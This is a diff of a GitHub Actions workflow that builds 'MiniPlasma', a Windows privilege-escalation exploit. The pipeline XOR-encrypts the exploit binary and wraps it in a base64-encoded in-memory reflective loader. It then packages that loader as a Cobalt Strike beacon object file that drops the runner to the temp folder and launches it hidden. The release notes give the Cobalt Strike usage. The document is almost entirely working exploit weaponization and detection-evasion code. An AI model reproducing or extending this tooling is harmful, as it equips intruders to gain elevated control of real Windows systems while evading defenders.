@@ -1,14 +1,11 @@
 name: Build MiniPlasma
-
 on:
   workflow_dispatch:
   push:
     branches: [main]
     paths: ['.github/workflows/build-miniplasma.yml']
-
 permissions:
   contents: write
-
 jobs:
   build:
     runs-on: windows-latest
@@ -24,163 +21,102 @@ jobs:
           Remove-Item -Recurse -Force MiniPlasma\packages -ErrorAction SilentlyContinue
           nuget restore MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln -PackagesDirectory MiniPlasma\packages
 
-      # ── Patch Stage0: Assembly.Location → MainModule.FileName ───────────────
-      - name: Patch Stage0 spawning for in-memory load
+      - name: Patch Stage0 (MP_EXE env var for child process path)
         shell: pwsh
         run: |
           $src = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\Program.cs"
           $txt = [IO.File]::ReadAllText($src)
           $patched = $txt.Replace(
               'typeof(Program).Assembly.Location',
-              'System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName')
+              'System.Environment.GetEnvironmentVariable("MP_EXE") ?? typeof(Program).Assembly.Location')
           [IO.File]::WriteAllText($src, $patched, [Text.Encoding]::UTF8)
-          if ($patched -ne $txt) { Write-Output "Patched Assembly.Location in $src" }
-          else { Write-Warning "Pattern not found - check source" }
+          if ($patched -ne $txt) { Write-Output "Patched Stage0" } else { Write-Warning "Pattern not found" }
 
-      # ── Build inner EXE (full exploit, Costura single-file) ───────────────
-      - name: Build inner EXE (exploit payload)
+      - name: Build inner EXE (full exploit, Costura single-file)
         run: >
           msbuild MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln
           /p:Configuration=Release /p:Platform="Any CPU"
           /p:SignManifests=false /p:Optimize=true
 
-      # ── XOR-encrypt inner EXE + build wrapper DLL ─────────────────────────
-      - name: Build wrapper DLL (XOR-encrypted payload + Start() stub)
+      # ── XOR-encrypt inner EXE + build self-contained Runner EXE ──────────────
+      - name: XOR-encrypt inner EXE and build Runner EXE
         shell: pwsh
         run: |
           $innerExe = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
-          $wrDir = "$env:TEMP\wrapper"
+          $wrDir = "$env:TEMP\build_runner"
           New-Item -ItemType Directory -Force $wrDir | Out-Null
 
-          # XOR-encrypt the inner EXE with a random key
           $bytes = [IO.File]::ReadAllBytes($innerExe)
           $key = Get-Random -Minimum 1 -Maximum 255
           for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }
           [IO.File]::WriteAllBytes("$wrDir\payload.enc", $bytes)
-          Write-Output "Encrypted $($bytes.Length) bytes with key $key"
+          Write-Output "Inner EXE encrypted: $($bytes.Length) bytes  key=$key"
 
-          # WrapperExport.cs template (XORKEY substituted with actual key)
-          $tplB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwp1c2luZyBSR2llc2Vja2UuRGxsRXhwb3J0OwoKbmFtZXNwYWNlIFBvQ19BYm9ydEh5ZHJhdGlvbl9BcmJpdHJhcnlSZWdLZXlfRW9QCnsKICAgIHB1YmxpYyBjbGFzcyBEbGxFbnRyeVBvaW50CiAgICB7CiAgICAgICAgW0RsbEV4cG9ydCgiU3RhcnQiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgU3RhcnQoSW50UHRyIGh3bmQsIEludFB0ciBoaW5zdCwgc3RyaW5nIGxwc3pDbWRMaW5lLCBpbnQgbkNtZFNob3cpCiAgICAgICAgewogICAgICAgICAgICBzdHJpbmdbXSBhcmdzID0gc3RyaW5nLklzTnVsbE9yRW1wdHkobHBzekNtZExpbmUpCiAgICAgICAgICAgICAgICA/IG5ldyBzdHJpbmdbMF0KICAgICAgICAgICAgICAgIDogbHBzekNtZExpbmUuVHJpbSgpLlNwbGl0KG5ldyBjaGFyW117JyAnfSwgU3RyaW5nU3BsaXRPcHRpb25zLlJlbW92ZUVtcHR5RW50cmllcyk7CiAgICAgICAgICAgIFJ1bihhcmdzKTsKICAgICAgICB9CgogICAgICAgIHN0YXRpYyB2b2lkIFJ1bihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFN0cmVhbSBzID0gQXNzZW1ibHkuR2V0RXhlY3V0aW5nQXNzZW1ibHkoKQogICAgICAgICAgICAgICAgICAgIC5HZXRNYW5pZmVzdFJlc291cmNlU3RyZWFtKCJQb0NfQWJvcnRIeWRyYXRpb25fQXJiaXRyYXJ5UmVnS2V5X0VvUC5wYXlsb2FkLmVuYyIpOwogICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZiA9IG5ldyBieXRlW3MuTGVuZ3RoXTsKICAgICAgICAgICAgICAgIHMuUmVhZChidWYsIDAsIGJ1Zi5MZW5ndGgpOwogICAgICAgICAgICAgICAgcy5EaXNwb3NlKCk7CiAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGJ1Zi5MZW5ndGg7IGkrKykgYnVmW2ldIF49IFhPUktFWTsKICAgICAgICAgICAgICAgIEFzc2VtYmx5IGFzbSA9IEFzc2VtYmx5LkxvYWQoYnVmKTsKICAgICAgICAgICAgICAgIGFzbS5HZXRUeXBlKCJQb0NfQWJvcnRIeWRyYXRpb25fQXJiaXRyYXJ5UmVnS2V5X0VvUC5Qcm9ncmFtIikKICAgICAgICAgICAgICAgICAgIC5HZXRNZXRob2QoIk1haW4iLCBCaW5kaW5nRmxhZ3MuU3RhdGljIHwgQmluZGluZ0ZsYWdzLlB1YmxpYyB8IEJpbmRpbmdGbGFncy5Ob25QdWJsaWMpCiAgICAgICAgICAgICAgICAgICAuSW52b2tlKG51bGwsIG5ldyBvYmplY3RbXSB7IGFyZ3MgfSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggeyB9CiAgICAgICAgfQogICAgfQp9"
-          $src = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($tplB64)).Replace("XORKEY", $key.ToString())
-          [IO.File]::WriteAllText("$wrDir\WrapperExport.cs", $src, [Text.Encoding]::UTF8)
+          $runnerB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwoKY2xhc3MgUnVubmVyCnsKICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgIHsKICAgICAgICBFbnZpcm9ubWVudC5TZXRFbnZpcm9ubWVudFZhcmlhYmxlKCJNUF9FWEUiLAogICAgICAgICAgICBBc3NlbWJseS5HZXRFeGVjdXRpbmdBc3NlbWJseSgpLkxvY2F0aW9uKTsKICAgICAgICB2YXIgcyA9IEFzc2VtYmx5LkdldEV4ZWN1dGluZ0Fzc2VtYmx5KCkKICAgICAgICAgICAgLkdldE1hbmlmZXN0UmVzb3VyY2VTdHJlYW0oCiAgICAgICAgICAgICAgICAiUG9DX0Fib3J0SHlkcmF0aW9uX0FyYml0cmFyeVJlZ0tleV9Fb1AucGF5bG9hZC5lbmMiKTsKICAgICAgICBpZiAocyA9PSBudWxsKSB7IEVudmlyb25tZW50LkV4aXQoMSk7IHJldHVybjsgfQogICAgICAgIGJ5dGVbXSBidWYgPSBuZXcgYnl0ZVtzLkxlbmd0aF07CiAgICAgICAgcy5SZWFkKGJ1ZiwgMCwgYnVmLkxlbmd0aCk7CiAgICAgICAgcy5EaXNwb3NlKCk7CiAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBidWYuTGVuZ3RoOyBpKyspIGJ1ZltpXSBePSBYT1JLRVlfVkFMVUU7CiAgICAgICAgdmFyIGlubmVyID0gQXNzZW1ibHkuTG9hZChidWYpOwogICAgICAgIGlubmVyLkdldFR5cGUoIlBvQ19BYm9ydEh5ZHJhdGlvbl9BcmJpdHJhcnlSZWdLZXlfRW9QLlByb2dyYW0iKQogICAgICAgICAgICAuR2V0TWV0aG9kKCJNYWluIiwKICAgICAgICAgICAgICAgIEJpbmRpbmdGbGFncy5TdGF0aWMgfCBCaW5kaW5nRmxhZ3MuUHVibGljIHwgQmluZGluZ0ZsYWdzLk5vblB1YmxpYykKICAgICAgICAgICAgLkludm9rZShudWxsLCBuZXcgb2JqZWN0W10geyBhcmdzIH0pOwogICAgfQp9"
+          $runnerSrc = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($runnerB64))
+          $runnerSrc = $runnerSrc.Replace("XORKEY_VALUE", $key.ToString())
+          [IO.File]::WriteAllText("$wrDir\Runner.cs", $runnerSrc, [Text.Encoding]::UTF8)
 
-          # DllExportStub.cs
-          $stubB64 = "bmFtZXNwYWNlIFJHaWVzZWNrZS5EbGxFeHBvcnQKewogICAgW1N5c3RlbS5BdHRyaWJ1dGVVc2FnZShTeXN0ZW0uQXR0cmlidXRlVGFyZ2V0cy5NZXRob2QpXQogICAgaW50ZXJuYWwgc2VhbGVkIGNsYXNzIERsbEV4cG9ydEF0dHJpYnV0ZSA6IFN5c3RlbS5BdHRyaWJ1dGUKICAgIHsKICAgICAgICBwdWJsaWMgRGxsRXhwb3J0QXR0cmlidXRlKHN0cmluZyBuYW1lKSB7IH0KICAgIH0KfQ=="
-          [IO.File]::WriteAllBytes("$wrDir\DllExportStub.cs", [Convert]::FromBase64String($stubB64))
-
-          # Compile wrapper DLL directly with csc.exe (x64 library, payload.enc embedded)
           $csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
-          $rawDll = "$wrDir\wrapper_raw.dll"
-          & $csc /nologo /optimize /target:library /platform:x64 `
-              "/out:$rawDll" `
+          $runnerExe = "$wrDir\runner.exe"
+          & $csc /nologo /optimize /target:exe /out:$runnerExe `
               "/res:$wrDir\payload.enc,PoC_AbortHydration_ArbitraryRegKey_EoP.payload.enc" `
-              "$wrDir\WrapperExport.cs" "$wrDir\DllExportStub.cs"
-          if ($LASTEXITCODE -ne 0) { throw "csc wrapper build failed" }
-          Write-Output "Wrapper raw DLL: $((Get-Item $rawDll).Length) bytes"
+              "$wrDir\Runner.cs"
+          if ($LASTEXITCODE -ne 0) { throw "Runner.exe build failed" }
+          Write-Output "Runner.exe: $((Get-Item $runnerExe).Length) bytes"
+          Write-Output "RUNNER_EXE=$runnerExe" >> $env:GITHUB_ENV
 
-          # Store path for next step
-          Write-Output "WRAPPER_RAW_DLL=$rawDll" >> $env:GITHUB_ENV
-
-      # ── Inject Start() export via ildasm/ilasm ────────────────────────────
-      - name: Inject native Start() export (ildasm + ilasm)
+      # ── XOR-encrypt runner + generate bof.c + compile BOF ────────────────────
+      - name: Generate and compile BOF
         shell: pwsh
         run: |
-          $dllIn = $env:WRAPPER_RAW_DLL
-          $work  = "$env:TEMP\il_export"
-          Remove-Item -Recurse -Force $work -ErrorAction SilentlyContinue
-          New-Item -ItemType Directory -Force $work | Out-Null
+          $runnerExe = $env:RUNNER_EXE
+          $bofDir = "$env:TEMP\bof_build"
+          New-Item -ItemType Directory -Force $bofDir | Out-Null
 
-          $ildasm = Get-ChildItem "C:\Program Files (x86)\Microsoft SDKs\Windows" -Recurse -Filter "ildasm.exe" -ErrorAction SilentlyContinue |
-                    Where-Object { $_.FullName -notmatch "arm" } |
-                    Sort-Object { if ($_.FullName -match "x64") { 0 } else { 1 } } |
-                    Select-Object -First 1
-          if (-not $ildasm) { throw "ildasm.exe not found" }
-          $ilasm = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe"
-          if (-not (Test-Path $ilasm)) { throw "ilasm.exe not found" }
+          $rBytes = [IO.File]::ReadAllBytes($runnerExe)
+          $key2 = Get-Random -Minimum 1 -Maximum 255
+          for ($i = 0; $i -lt $rBytes.Length; $i++) { $rBytes[$i] = $rBytes[$i] -bxor $key2 }
+          $hexBytes = [System.BitConverter]::ToString($rBytes).Replace('-', ',0x').Insert(0, '0x')
+          Write-Output "Runner encrypted: $($rBytes.Length) bytes  key2=$key2"
 
-          $ilPath = "$work\poc.il"
-          & $ildasm.FullName /all /nobar "/output=$ilPath" $dllIn
-          Write-Output "Disassembled: $((Get-Item $ilPath).Length) bytes"
+          $bofB64 = "I2luY2x1ZGUgPHdpbmRvd3MuaD4KCiNkZWZpbmUgQ0FMTEJBQ0tfT1VUUFVUIDB4MDAKI2RlZmluZSBDQUxMQkFDS19FUlJPUiAgMHgwZAp2b2lkIEJlYWNvblByaW50ZihpbnQgdHlwZSwgY2hhciAqIGZtdCwgLi4uKTsKCnN0YXRpYyBjb25zdCB1bnNpZ25lZCBjaGFyIFJVTk5FUl9FTkNbXSA9IHtQTEFDRUhPTERFUl9CWVRFU307CnN0YXRpYyBjb25zdCBpbnQgUlVOTkVSX0xFTiA9IFBMQUNFSE9MREVSX0xFTjsKc3RhdGljIGNvbnN0IHVuc2lnbmVkIGNoYXIgUlVOTkVSX0tFWSA9ICh1bnNpZ25lZCBjaGFyKVBMQUNFSE9MREVSX0tFWTsKCnN0YXRpYyB2b2lkIGJ1aWxkcGF0aChjaGFyKiBvdXQsIGNvbnN0IGNoYXIqIGRpciwgdW5zaWduZWQgaW50IHRpY2spIHsKICAgIHN0YXRpYyBjb25zdCBjaGFyIGhleFtdID0gIjAxMjM0NTY3ODlBQkNERUYiOwogICAgaW50IGs7CiAgICBsc3RyY3B5QShvdXQsIGRpcik7CiAgICBsc3RyY2F0QShvdXQsICJtcGxhcyIpOwogICAgewogICAgICAgIGNoYXIqIHAgPSBvdXQgKyBsc3RybGVuQShvdXQpOwogICAgICAgIGZvciAoayA9IDA7IGsgPCA4OyBrKyspCiAgICAgICAgICAgIHBba10gPSBoZXhbKHRpY2sgPj4gKDI4IC0gayo0KSkgJiAweEZdOwogICAgICAgIHBbOF0gPSAwOwogICAgfQogICAgbHN0cmNhdEEob3V0LCAiLmV4ZSIpOwp9Cgp2b2lkIGdvKGNoYXIgKiBhcmdzLCBpbnQgbGVuKSB7CiAgICBjaGFyIHRtcGRpcltNQVhfUEFUSF07CiAgICBjaGFyIHJ1bm5lcnBhdGhbTUFYX1BBVEhdOwogICAgSEFORExFIGhGaWxlOwogICAgRFdPUkQgd3JpdHRlbiA9IDA7CiAgICBTVEFSVFVQSU5GT0Egc2k7CiAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpOwogICAgdW5zaWduZWQgY2hhciAqIGJ1ZjsKICAgIGludCBpOwoKICAgIGJ1ZiA9ICh1bnNpZ25lZCBjaGFyICopSGVhcEFsbG9jKEdldFByb2Nlc3NIZWFwKCksIDAsIFJVTk5FUl9MRU4pOwogICAgaWYgKCFidWYpIHJldHVybjsKICAgIGZvciAoaSA9IDA7IGkgPCBSVU5ORVJfTEVOOyBpKyspIGJ1ZltpXSA9IFJVTk5FUl9FTkNbaV0gXiBSVU5ORVJfS0VZOwoKICAgIGlmICghR2V0VGVtcFBhdGhBKE1BWF9QQVRILCB0bXBkaXIpKSB7CiAgICAgICAgSGVhcEZyZWUoR2V0UHJvY2Vzc0hlYXAoKSwgMCwgYnVmKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBidWlsZHBhdGgocnVubmVycGF0aCwgdG1wZGlyLCAodW5zaWduZWQgaW50KUdldFRpY2tDb3VudCgpKTsKCiAgICBoRmlsZSA9IENyZWF0ZUZpbGVBKHJ1bm5lcnBhdGgsIEdFTkVSSUNfV1JJVEUsIDAsIE5VTEwsCiAgICAgICAgQ1JFQVRFX0FMV0FZUywgRklMRV9BVFRSSUJVVEVfTk9STUFMLCBOVUxMKTsKICAgIGlmIChoRmlsZSA9PSBJTlZBTElEX0hBTkRMRV9WQUxVRSkgewogICAgICAgIEhlYXBGcmVlKEdldFByb2Nlc3NIZWFwKCksIDAsIGJ1Zik7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgV3JpdGVGaWxlKGhGaWxlLCBidWYsIChEV09SRClSVU5ORVJfTEVOLCAmd3JpdHRlbiwgTlVMTCk7CiAgICBDbG9zZUhhbmRsZShoRmlsZSk7CiAgICBIZWFwRnJlZShHZXRQcm9jZXNzSGVhcCgpLCAwLCBidWYpOwoKICAgIFplcm9NZW1vcnkoJnNpLCBzaXplb2Yoc2kpKTsKICAgIFplcm9NZW1vcnkoJnBpLCBzaXplb2YocGkpKTsKICAgIHNpLmNiID0gc2l6ZW9mKHNpKTsKCiAgICBpZiAoIUNyZWF0ZVByb2Nlc3NBKHJ1bm5lcnBhdGgsIE5VTEwsIE5VTEwsIE5VTEwsIDAsCiAgICAgICAgICAgIENSRUFURV9OT19XSU5ET1csIE5VTEwsIE5VTEwsICZzaSwgJnBpKSkgewogICAgICAgIEJlYWNvblByaW50ZihDQUxMQkFDS19FUlJPUiwgIlstXSBDcmVhdGVQcm9jZXNzIGZhaWxlZCAlZFxuIiwgR2V0TGFzdEVycm9yKCkpOwogICAgICAgIERlbGV0ZUZpbGVBKHJ1bm5lcnBhdGgpOwogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBCZWFjb25QcmludGYoQ0FMTEJBQ0tfT1VUUFVULCAiWytdIE1pbmlQbGFzbWEgUElEICVkXG4iLCAoaW50KXBpLmR3UHJvY2Vzc0lkKTsKICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwp9"
+          $bofSrc = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($bofB64))
+          $bofSrc = $bofSrc.Replace("PLACEHOLDER_BYTES", $hexBytes)
+          $bofSrc = $bofSrc.Replace("PLACEHOLDER_LEN",  $rBytes.Length.ToString())
+          $bofSrc = $bofSrc.Replace("PLACEHOLDER_KEY",  $key2.ToString())
+          [IO.File]::WriteAllText("$bofDir\bof.c", $bofSrc, [Text.Encoding]::UTF8)
+          Write-Output "bof.c: $((Get-Item "$bofDir\bof.c").Length) bytes"
 
-          $il = [IO.File]::ReadAllText($ilPath)
+          $cl = Get-ChildItem "C:\Program Files\Microsoft Visual Studio" `
+              -Recurse -Filter "cl.exe" -ErrorAction SilentlyContinue |
+              Where-Object { $_.FullName -match "Hostx64\\x64" } |
+              Select-Object -First 1 -ExpandProperty FullName
+          if (-not $cl) { throw "cl.exe not found" }
+          Write-Output "Compiler: $cl"
 
-          $searchFrom = 0; $moduleEnd = -1
-          while ($true) {
-              $idx = $il.IndexOf("`r`n.module ", $searchFrom)
-              if ($idx -lt 0) { break }
-              if (-not $il.Substring($idx + 2).StartsWith(".module extern")) {
-                  $lineEndIdx = $il.IndexOf("`r`n", $idx + 2)
-                  if ($lineEndIdx -lt 0) { $lineEndIdx = $il.Length }
-                  $moduleEnd = $lineEndIdx; break
-              }
-              $searchFrom = $idx + 1
-          }
-          if ($moduleEnd -ge 0) {
-              $vtfixup = "`r`n.vtfixup [1] int64 fromunmanaged at VT_01`r`n.data VT_01 = int64(0)"
-              $il = $il.Substring(0, $moduleEnd) + $vtfixup + $il.Substring($moduleEnd)
-              Write-Output "vtfixup injected"
-          }
+          $bofObj = "$bofDir\miniplasma.o"
+          & $cl /c /GS- /W0 /nologo /O2 "$bofDir\bof.c" "/Fo$bofObj"
+          if ($LASTEXITCODE -ne 0) { throw "BOF compile failed" }
+          Write-Output "BOF object: $((Get-Item $bofObj).Length) bytes"
+          Write-Output "BOF_OBJ=$bofObj" >> $env:GITHUB_ENV
 
-          $startSig = "void  Start("; $sigIdx = $il.IndexOf($startSig)
-          if ($sigIdx -lt 0) { $startSig = "void Start("; $sigIdx = $il.IndexOf($startSig) }
-          if ($sigIdx -ge 0) {
-              $cilIdx   = $il.IndexOf("cil managed", $sigIdx)
-              $braceIdx = $il.IndexOf("{", $cilIdx)
-              if ($braceIdx -ge 0) {
-                  $inject = "`r`n    .vtentry 1 : 1`r`n    .export [1] as Start"
-                  $il = $il.Substring(0, $braceIdx + 1) + $inject + $il.Substring($braceIdx + 1)
-                  Write-Output ".vtentry/.export injected"
-              }
-          }
-
-          $modIl = "$work\poc_export.il"
-          [IO.File]::WriteAllText($modIl, $il)
-
-          $resFile = "$work\poc.res"
-          $outDll  = "$work\output.dll"
-          $ilasmArgs = @("/dll", "/x64", "/optimize", "/nologo", "/output=$outDll")
-          if (Test-Path $resFile) { $ilasmArgs += "/resource=$resFile" }
-          $ilasmArgs += $modIl
-          & $ilasm @ilasmArgs
-
-          if (Test-Path $outDll) {
-              New-Item -ItemType Directory -Force staging | Out-Null
-              Copy-Item $outDll "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll"
-              Write-Output "DLL staged: $((Get-Item "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.dll").Length) bytes"
-          } else { throw "ilasm failed" }
-
-      # ── Build thin launcher EXE ────────────────────────────────────────────
-      - name: Build thin launcher EXE
+      - name: Stage artifacts
         shell: pwsh
         run: |
-          $tmpDir = "$env:TEMP\launcher_build"
-          New-Item -ItemType Directory -Force $tmpDir | Out-Null
+          New-Item -ItemType Directory -Force staging | Out-Null
+          Copy-Item $env:BOF_OBJ  "staging\miniplasma.o"
+          Copy-Item $env:RUNNER_EXE "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
+          Get-ChildItem staging\ | Format-Table Name, Length
 
-          # Launcher.cs: loads wrapper DLL via UnsafeLoadFrom (works on network shares)
-          $launcherB64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwoKY2xhc3MgTGF1bmNoZXIKewogICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgewogICAgICAgIHN0cmluZyBkbGxQYXRoID0gUGF0aC5Db21iaW5lKAogICAgICAgICAgICBQYXRoLkdldERpcmVjdG9yeU5hbWUoQXNzZW1ibHkuR2V0RXhlY3V0aW5nQXNzZW1ibHkoKS5Mb2NhdGlvbiksCiAgICAgICAgICAgICJQb0NfQWJvcnRIeWRyYXRpb25fQXJiaXRyYXJ5UmVnS2V5X0VvUC5kbGwiKTsKICAgICAgICB2YXIgYXNtID0gQXNzZW1ibHkuVW5zYWZlTG9hZEZyb20oZGxsUGF0aCk7CiAgICAgICAgdmFyIHQgPSBhc20uR2V0VHlwZSgiUG9DX0Fib3J0SHlkcmF0aW9uX0FyYml0cmFyeVJlZ0tleV9Fb1AuRGxsRW50cnlQb2ludCIpOwogICAgICAgIHZhciBtID0gdC5HZXRNZXRob2QoIlN0YXJ0IiwgQmluZGluZ0ZsYWdzLlN0YXRpYyB8IEJpbmRpbmdGbGFncy5QdWJsaWMpOwogICAgICAgIHN0cmluZyBjbWQgPSBzdHJpbmcuSm9pbigiICIsIGFyZ3MpOwogICAgICAgIG0uSW52b2tlKG51bGwsIG5ldyBvYmplY3RbXSB7IEludFB0ci5aZXJvLCBJbnRQdHIuWmVybywgY21kLCAwIH0pOwogICAgfQp9"
-          [IO.File]::WriteAllBytes("$tmpDir\Launcher.cs", [Convert]::FromBase64String($launcherB64))
-
-          $csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
-          $exeOut = "$tmpDir\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
-          & $csc /nologo /optimize /target:exe /out:$exeOut "$tmpDir\Launcher.cs"
-          if ($LASTEXITCODE -ne 0) { throw "csc launcher build failed" }
-
-          Copy-Item $exeOut "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
-          Write-Output "EXE staged: $((Get-Item "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe").Length) bytes"
-
-      - name: List staging
-        shell: pwsh
-        run: Get-ChildItem staging\ | Format-Table Name, Length
-
-      # ── Publish release ────────────────────────────────────────────────────
       - name: Create GitHub Release
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         shell: pwsh
         run: |
-          $tag = "v5.2-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
+          $tag = "v6.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
           gh release create $tag staging\* `
-            --title "MiniPlasma v5.2 - fix Stage0 Assembly.Location patch" `
-            --notes "Fixed: patch Assembly.Location to MainModule.FileName before inner EXE build so Stage0 can spawn child processes when loaded via Assembly.Load(byte[]). EXE+DLL must be in same directory." `
+            --title "MiniPlasma v6.0 - Cobalt Strike BOF" `
+            --notes "miniplasma.o: CS BOF - drops self-contained runner to temp, spawns exploit. Usage: inline-execute miniplasma.o. EXE: standalone runner for direct testing." `
             --repo $env:GITHUB_REPOSITORY
           Write-Output "Release: $tag"
